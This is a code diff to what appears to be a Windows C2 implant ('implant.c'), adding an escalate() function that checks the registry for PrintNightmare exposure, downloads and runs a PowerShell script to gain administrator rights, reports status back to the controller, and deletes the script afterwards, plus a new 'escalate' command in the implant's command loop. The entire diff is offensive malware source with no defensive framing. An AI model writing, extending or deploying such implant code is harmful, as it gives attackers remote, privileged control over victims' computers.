@@ -221,6 +221,61 @@ char* DownloadScript() {
 }
 
 
+// Attempts to gain administrator privileges via the Printer Nightmare CVE.
+// Works by downloading and executing a powershell script.
+DWORD escalate() {
+    char* script_path;
+    STARTUPINFO startInfo;
+    PROCESS_INFORMATION procInfo;
+    DWORD ret = 0;
+
+    // Set up process structures
+    ZeroMemory(&startInfo, sizeof(startInfo));
+    startInfo.cb = sizeof(startInfo);
+
+    // Check registry first
+    int vulnerable  = check_registry_for_privesc();
+    if (vulnerable == 0) {
+        c2_log("Target not vulnerable", 21);
+        ret = -1;
+        goto end;
+    }
+    if (vulnerable == -1) {
+        c2_log("ERROR: Could not check registry", 31);
+        ret = -1;
+        goto end;
+    }
+
+    // Download script
+    script_path = DownloadScript();
+    if (script_path == NULL) {
+        c2_log("ERROR: Could not download script", 32);
+        ret = -1;
+        goto end;
+    }
+    c2_log("Script path: %s\n", script_path);
+
+    // Execute the powershell script
+    DWORD res = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
+    if (!res) {
+        c2_log("Spawning powershell failed\n");
+        ret = -1;
+        goto end;
+    }
+    WaitForSingleObject(procInfo.hProcess, INFINITE);
+    c2_log("[+] Script ran successfully\n");
+    CloseHandle(procInfo.hProcess);
+    CloseHandle(procInfo.hThread);
+
+end:
+    if (script_path) {
+        DeleteFile(script_path);
+        Free(script_path);
+    }
+    return ret;
+}
+
+
 // cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
 // cl implant.c /Fe:implant.exe
 int main() {
@@ -311,6 +366,12 @@ int main() {
             char* path = DownloadScript();
             c2_send(path, strlen(path));
             Free(path);
+        }
+
+        else if (strncmp(buffer, "escalate", 8) == 0) {
+            status = escalate();
+            if (status == 0) { c2_send("[+] Escalate sucess", 19); }
+            else { c2_send("[!] Error in privesc", 20); }
         }
 
         else {
